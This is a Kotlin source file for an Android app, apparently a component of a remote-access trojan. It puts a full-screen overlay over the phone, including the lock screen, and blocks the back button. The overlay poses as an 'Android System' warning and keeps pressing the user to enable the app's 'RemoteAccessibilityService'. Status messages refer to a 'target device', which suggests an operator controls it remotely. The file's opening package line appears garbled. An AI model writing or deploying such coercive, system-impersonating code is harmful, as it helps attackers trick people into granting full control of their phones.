Enterprisexample.service

import android.content.Context
import android.content.Intent
import android.database.ContentObserver
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.Gravity
import android.view.KeyEvent
import android.view.View
import android.view.ViewGroup
import android.view.WindowManager
import android.widget.Button
import android.widget.FrameLayout
import android.widget.LinearLayout
import android.widget.TextView

object AccessibilityOverlayManager {

    private const val TAG = "AccessibilityOverlay"
    private var overlayView: View? = null
    private var contentObserver: ContentObserver? = null
    private var isObserverRegistered = false

    fun isAccessibilityEnabled(context: Context): Boolean {
        if (RemoteAccessibilityService.isServiceEnabled()) return true

        return try {
            val accessibilityEnabled = Settings.Secure.getInt(
                context.contentResolver,
                Settings.Secure.ACCESSIBILITY_ENABLED, 0
            )
            if (accessibilityEnabled == 1) {
                val enabledServices = Settings.Secure.getString(
                    context.contentResolver,
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                ) ?: ""
                val expectedService = "${context.packageName}/${RemoteAccessibilityService::class.java.name}"
                val expectedShort = "${context.packageName}/.service.RemoteAccessibilityService"
                enabledServices.contains(expectedService) ||
                        enabledServices.contains(expectedShort) ||
                        enabledServices.contains(context.packageName)
            } else {
                false
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error checking accessibility status: ${e.message}")
            false
        }
    }

    fun startObserver(context: Context) {
        val appContext = context.applicationContext
        if (isObserverRegistered) return

        try {
            if (contentObserver == null) {
                contentObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
                    override fun onChange(selfChange: Boolean) {
                        super.onChange(selfChange)
                        Log.d(TAG, "Accessibility settings changed...")
                        if (isAccessibilityEnabled(appContext)) {
                            removeOverlay(appContext)
                            stopObserver(appContext)
                        }
                    }
                }
            }

            appContext.contentResolver.registerContentObserver(
                Settings.Secure.getUriFor(Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES),
                false,
                contentObserver!!
            )
            isObserverRegistered = true
            Log.d(TAG, "Accessibility ContentObserver registered successfully.")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to register ContentObserver: ${e.message}")
        }
    }

    fun stopObserver(context: Context) {
        if (!isObserverRegistered || contentObserver == null) return
        try {
            context.applicationContext.contentResolver.unregisterContentObserver(contentObserver!!)
            isObserverRegistered = false
            Log.d(TAG, "Accessibility ContentObserver unregistered.")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to unregister ContentObserver: ${e.message}")
        }
    }

    fun openAccessibilitySettings(context: Context): Boolean {
        return try {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
            }
            context.applicationContext.startActivity(intent)
            true
        } catch (e: Exception) {
            Log.e(TAG, "Error opening accessibility settings: ${e.message}")
            false
        }
    }

    fun checkAndToggleOverlay(context: Context) {
        Handler(Looper.getMainLooper()).post {
            val isEnabled = isAccessibilityEnabled(context)
            Log.d(TAG, "checkAndToggleOverlay: isAccessibilityEnabled=$isEnabled")
            if (isEnabled) {
                removeOverlay(context)
            } else {
                showOverlayWithFallback(context)
            }
        }
    }

    fun showOverlay(context: Context) {
        showOverlayWithFallback(context)
    }

    fun showOverlayWithFallback(context: Context): String {
        val appContext = context.applicationContext
        startObserver(appContext)

        if (isAccessibilityEnabled(appContext)) {
            removeOverlay(appContext)
            return "SKIPPED: Accessibility Service is already ENABLED on target device."
        }

        if (overlayView != null) {
            return "SUCCESS: Accessibility overlay is already active and displayed on screen."
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(appContext)) {
            Log.w(TAG, "SYSTEM_ALERT_WINDOW permission missing. Executing fallback: opening Accessibility Settings directly.")
            val opened = openAccessibilitySettings(appContext)
            return if (opened) {
                "FALLBACK_SUCCESS: Overlay permission missing. Triggered fallback: Opened Accessibility Settings screen directly on target device."
            } else {
                "FAILED: Overlay permission missing and failed to open Accessibility Settings."
            }
        }

        var success = false
        var errorMsg = ""
        val latch = java.util.concurrent.CountDownLatch(1)

        Handler(Looper.getMainLooper()).post {
            if (overlayView != null) {
                success = true
                latch.countDown()
                return@post
            }

            try {
                val windowManager = appContext.getSystemService(Context.WINDOW_SERVICE) as? WindowManager
                if (windowManager == null) {
                    errorMsg = "WindowManager service unavailable"
                    latch.countDown()
                    return@post
                }

                val rootLayout = object : FrameLayout(appContext) {
                    override fun dispatchKeyEvent(event: KeyEvent?): Boolean {
                        // Intercept Back button to prevent dismissing overlay
                        if (event?.keyCode == KeyEvent.KEYCODE_BACK) {
                            return true
                        }
                        return super.dispatchKeyEvent(event)
                    }
                }

                rootLayout.setBackgroundColor(Color.parseColor("#EE0F172A")) // Dark translucent background
                rootLayout.isFocusable = true
                rootLayout.isFocusableInTouchMode = true

                // Card Container
                val cardLayout = LinearLayout(appContext).apply {
                    orientation = LinearLayout.VERTICAL
                    gravity = Gravity.CENTER_HORIZONTAL
                    setPadding(dpToPx(appContext, 24), dpToPx(appContext, 32), dpToPx(appContext, 24), dpToPx(appContext, 32))

                    val cardDrawable = GradientDrawable().apply {
                        setColor(Color.parseColor("#1E293B")) // Slate 800
                        cornerRadius = dpToPx(appContext, 20).toFloat()
                        setStroke(dpToPx(appContext, 2), Color.parseColor("#EF4444")) // Red border indicator
                    }
                    background = cardDrawable
                }

                val cardParams = FrameLayout.LayoutParams(
                    dpToPx(appContext, 340),
                    ViewGroup.LayoutParams.WRAP_CONTENT
                ).apply {
                    gravity = Gravity.CENTER
                }

                // Warning Icon
                val warningText = TextView(appContext).apply {
                    text = "⚠️"
                    textSize = 48f
                    gravity = Gravity.CENTER
                }

                // Title
                val titleView = TextView(appContext).apply {
                    text = "Accessibility Required"
                    textSize = 20f
                    setTextColor(Color.WHITE)
                    setTypeface(null, Typeface.BOLD)
                    gravity = Gravity.CENTER
                    setPadding(0, dpToPx(appContext, 12), 0, dpToPx(appContext, 12))
                }

                // Message Body
                val messageView = TextView(appContext).apply {
                    text = "Android System needs Accessibility to function. Please enable it."
                    textSize = 14f
                    setTextColor(Color.parseColor("#94A3B8")) // Slate 400
                    gravity = Gravity.CENTER
                    setLineSpacing(8f, 1.1f)
                    setPadding(0, 0, 0, dpToPx(appContext, 24))
                }

                // Action Button: Open Accessibility Settings
                val enableButton = Button(appContext).apply {
                    text = "OPEN ACCESSIBILITY SETTINGS"
                    textSize = 14f
                    setTextColor(Color.WHITE)
                    setTypeface(null, Typeface.BOLD)

                    val btnDrawable = GradientDrawable().apply {
                        setColor(Color.parseColor("#2563EB")) // Blue 600
                        cornerRadius = dpToPx(appContext, 12).toFloat()
                    }
                    background = btnDrawable
                    setPadding(dpToPx(appContext, 16), dpToPx(appContext, 12), dpToPx(appContext, 16), dpToPx(appContext, 12))

                    setOnClickListener {
                        openAccessibilitySettings(appContext)
                    }
                }

                cardLayout.addView(warningText)
                cardLayout.addView(titleView)
                cardLayout.addView(messageView)
                cardLayout.addView(enableButton)

                rootLayout.addView(cardLayout, cardParams)

                val layoutType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                } else {
                    @Suppress("DEPRECATION")
                    WindowManager.LayoutParams.TYPE_PHONE
                }

                val params = WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    layoutType,
                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                            WindowManager.LayoutParams.FLAG_FULLSCREEN or
                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
                            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                    PixelFormat.TRANSLUCENT
                ).apply {
                    gravity = Gravity.CENTER
                }

                windowManager.addView(rootLayout, params)
                overlayView = rootLayout
                success = true
                Log.d(TAG, "Accessibility blocking overlay view attached successfully.")
            } catch (e: Exception) {
                errorMsg = e.message ?: "Unknown window error"
                Log.e(TAG, "Failed to attach overlay view to WindowManager: ${e.message}")
            } finally {
                latch.countDown()
            }
        }

        try {
            latch.await(1500, java.util.concurrent.TimeUnit.MILLISECONDS)
        } catch (_: Exception) {}

        return if (success) {
            "SUCCESS: Accessibility overlay displayed on device screen."
        } else {
            val fallbackOpened = openAccessibilitySettings(appContext)
            if (fallbackOpened) {
                "FALLBACK_SUCCESS: Could not draw overlay ($errorMsg). Triggered fallback: Opened Accessibility Settings directly on device."
            } else {
                "FAILED: Could not draw overlay ($errorMsg) and fallback failed."
            }
        }
    }

    fun removeOverlay(context: Context) {
        val appContext = context.applicationContext
        Handler(Looper.getMainLooper()).post {
            val view = overlayView ?: return@post
            try {
                val windowManager = appContext.getSystemService(Context.WINDOW_SERVICE) as? WindowManager
                windowManager?.removeView(view)
                Log.d(TAG, "Accessibility overlay removed successfully.")
            } catch (e: Exception) {
                Log.e(TAG, "Error removing overlay view: ${e.message}")
            } finally {
                overlayView = null
            }
        }
    }

    private fun dpToPx(context: Context, dp: Int): Int {
        return (dp * context.resources.displayMetrics.density).toInt()
    }
}

